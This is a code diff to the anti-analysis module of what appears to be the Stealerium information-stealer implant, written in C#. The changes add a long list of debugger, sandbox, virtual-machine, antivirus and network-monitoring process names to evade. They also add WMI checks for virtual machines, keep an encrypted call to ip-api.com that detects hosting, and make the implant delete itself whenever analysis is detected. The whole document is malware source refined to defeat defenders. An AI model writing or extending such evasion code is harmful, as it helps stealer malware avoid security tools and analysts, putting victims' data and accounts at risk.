@@ -6,7 +6,6 @@ using System.Net.Http;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Threading.Tasks;
-using System.Windows.Forms;
 using Stealerium.Helpers;
 
 namespace Stealerium.Modules.Implant
@@ -21,9 +20,8 @@ namespace Stealerium.Modules.Implant
         [DllImport("kernel32.dll")]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
 
-
         /// <summary>
-        ///     Returns true if the file is running in debugger; otherwise returns false
+        /// Detects if the file is being debugged.
         /// </summary>
         public static bool Debugger()
         {
@@ -35,14 +33,12 @@ namespace Stealerium.Modules.Implant
             }
             catch
             {
-                // ignored
+                return false;
             }
-
-            return isDebuggerPresent;
         }
 
         /// <summary>
-        ///     Returns true if the file is running in emulator; otherwise returns false
+        /// Detects if the file is running in an emulator.
         /// </summary>
         public static bool Emulator()
         {
@@ -55,14 +51,14 @@ namespace Stealerium.Modules.Implant
             }
             catch
             {
-                // ignored
+                return false;
             }
 
             return false;
         }
 
         /// <summary>
-        ///     Returns true if the file is running on the server (VirusTotal, AnyRun); otherwise returns false
+        /// Detects if the system is hosted in environments like VirusTotal or AnyRun.
         /// </summary>
         public static async Task<bool> HostingAsync()
         {
@@ -75,111 +71,147 @@ namespace Stealerium.Modules.Implant
                         145, 244, 154, 250, 238, 89, 238, 36, 197, 152,
                         49, 235, 197, 102, 94, 163, 45, 250, 10,
                         108, 175, 221, 139, 165, 121, 24
-                        // http://ip-api.com/line/?fields=hosting
                     })).ConfigureAwait(false);
+
                     return status.Contains("true");
                 }
             }
             catch
             {
-                // ignored
+                return false;
             }
-
-            return false;
         }
 
         /// <summary>
-        ///     Returns true if a process is started from the list; otherwise, returns false
+        /// Detects suspicious processes that are commonly used for analysis.
         /// </summary>
         public static bool Processes()
         {
             var runningProcessList = Process.GetProcesses();
-            string[] selectedProcessList =
+
+            // List of common tools and processes used for reverse engineering, system analysis, and debugging
+            string[] suspiciousProcesses =
             {
-                "processhacker",
-                "netstat", "netmon", "tcpview", "wireshark",
-                "filemon", "regmon", "cain"
+                // Debugging and reverse engineering tools
+                "processhacker", "netstat", "netmon", "tcpview", "wireshark", "filemon", "regmon", "cain",
+                "ollydbg", "ida", "ida64", "idag", "idag64", "idaw", "idaw64", "idau", "idau64", "scylla",
+                "scylla_x64", "scylla_x86", "procdump", "procmon", "x64dbg", "x32dbg", "windbg", "reshacker",
+        
+                // Virtual machine processes
+                "vmware", "vboxservice", "vboxtray", "vmsrvc", "vmusrvc",
+        
+                // Sandboxing tools
+                "sandboxie", "sandboxiedcomlaunch", "sandboxiedcomdll", "snxhk", "avast", "cuckoo",
+        
+                // Antivirus and security software often used in analysis
+                "avg", "avast", "avp", "kav", "sophos", "malwarebytes", "mbam", "emsisoft", "bitdefender",
+                "eset", "nod32", "mcshield", "clamwin", "clamav", "f-secure", "gdata", "zonealarm", 
+        
+                // Monitoring and system inspection tools
+                "autoruns", "autorunsc", "procexp", "procexp64", "perfmon", "sysmon", "sysinternals",
+        
+                // Network monitoring and inspection tools
+                "fiddler", "charles", "burpsuite", "mitmproxy", "netmon", "ethereal", "tshark",
+        
+                // Miscellaneous tools
+                "cheatengine", "de4dot", "xperf", "hxd", "dumpcap", "wireshark", "immunitydebugger", "resourcehacker"
             };
-            return runningProcessList.Any(process => selectedProcessList.Contains(process.ProcessName.ToLower()));
+
+            // Check if any running process matches the suspicious processes list
+            return runningProcessList.Any(process => suspiciousProcesses.Contains(process.ProcessName.ToLower()));
         }
 
+
         /// <summary>
-        ///     Returns true if the file is running in sandbox; otherwise returns false
+        /// Detects if the system is running in a sandbox.
         /// </summary>
         public static bool SandBox()
         {
-            var dlls = new[]
-            {
-                "SbieDll",
-                "SxIn",
-                "Sf2",
-                "snxhk",
-                "cmdvrt32"
-            };
-            return dlls.Any(dll => GetModuleHandle(dll + ".dll").ToInt32() != 0);
+            string[] sandboxDlls = { "SbieDll", "SxIn", "Sf2", "snxhk", "cmdvrt32" };
+            return sandboxDlls.Any(dll => GetModuleHandle(dll + ".dll") != IntPtr.Zero);
         }
 
         /// <summary>
-        ///     Returns true if the file is running in VirtualBox or VmWare; otherwise returns false
+        /// Detects if the system is running inside a Virtual Machine.
         /// </summary>
         public static bool VirtualBox()
         {
-            using (var managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
+            try
             {
-                try
+                using (var managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
                 {
                     using (var managementObjectCollection = managementObjectSearcher.Get())
                     {
-                        foreach (var managementBaseObject in managementObjectCollection)
-                            if ((managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" &&
-                                 managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) ||
-                                managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") ||
-                                managementBaseObject["Model"].ToString() == "VirtualBox")
+                        foreach (var obj in managementObjectCollection)
+                        {
+                            var manufacturer = obj["Manufacturer"].ToString().ToLower();
+                            var model = obj["Model"].ToString().ToUpperInvariant();
+
+                            if ((manufacturer == "microsoft corporation" && model.Contains("VIRTUAL")) ||
+                                manufacturer.Contains("vmware") || model == "VIRTUALBOX")
                                 return true;
+                        }
                     }
                 }
-                catch
+
+                foreach (var obj in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
                 {
-                    // ignored
+                    var name = obj.GetPropertyValue("Name").ToString();
+                    if (name.Contains("VMware") || name.Contains("VBox"))
+                        return true;
                 }
             }
-
-            foreach (var managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2",
-                         "SELECT * FROM Win32_VideoController").Get())
-                if (managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware")
-                    && managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox"))
-                    return true;
+            catch
+            {
+                return false;
+            }
 
             return false;
         }
 
         /// <summary>
-        ///     Detect virtual enviroment
+        /// Runs all anti-analysis checks and self-destructs if any hostile environment is detected.
         /// </summary>
         public static async Task<bool> RunAsync()
         {
             if (Config.AntiAnalysis != "1") return false;
-            if (await HostingAsync().ConfigureAwait(false)) Logging.Log("AntiAnalysis : Hosting detected!");
-            if (Processes()) Logging.Log("AntiAnalysis : Process detected!");
-            if (VirtualBox()) Logging.Log("AntiAnalysis : Virtual machine detected!");
-            if (SandBox()) Logging.Log("AntiAnalysis : SandBox detected!");
-            //if (Emulator())  Logging.Log("AntiAnalysis : Emulator detected!", true);
-            if (Debugger()) Logging.Log("AntiAnalysis : Debugger detected!");
+
+            if (await HostingAsync().ConfigureAwait(false))
+            {
+                Logging.Log("AntiAnalysis: Hosting detected! Self-destructing...");
+                SelfDestruct.Melt();
+                return true;
+            }
+
+            if (Processes())
+            {
+                Logging.Log("AntiAnalysis: Suspicious process detected! Self-destructing...");
+                SelfDestruct.Melt();
+                return true;
+            }
+
+            if (VirtualBox())
+            {
+                Logging.Log("AntiAnalysis: Virtual Machine detected! Self-destructing...");
+                SelfDestruct.Melt();
+                return true;
+            }
+
+            if (SandBox())
+            {
+                Logging.Log("AntiAnalysis: Sandbox detected! Self-destructing...");
+                SelfDestruct.Melt();
+                return true;
+            }
+
+            if (Debugger())
+            {
+                Logging.Log("AntiAnalysis: Debugger detected! Self-destructing...");
+                SelfDestruct.Melt();
+                return true;
+            }
 
             return false;
-        }
-
-        /// <summary>
-        ///     Run fake error message and self destruct
-        /// </summary>
-        public static void FakeErrorMessage()
-        {
-            var code = StringsCrypt.GenerateRandomData("1");
-            code = "0x" + code.Substring(0, 5);
-            Logging.Log("Sending fake error message box with code: " + code);
-            MessageBox.Show("Exit code " + code, "Runtime error",
-                MessageBoxButtons.RetryCancel, MessageBoxIcon.Error);
-            SelfDestruct.Melt();
         }
     }
 }
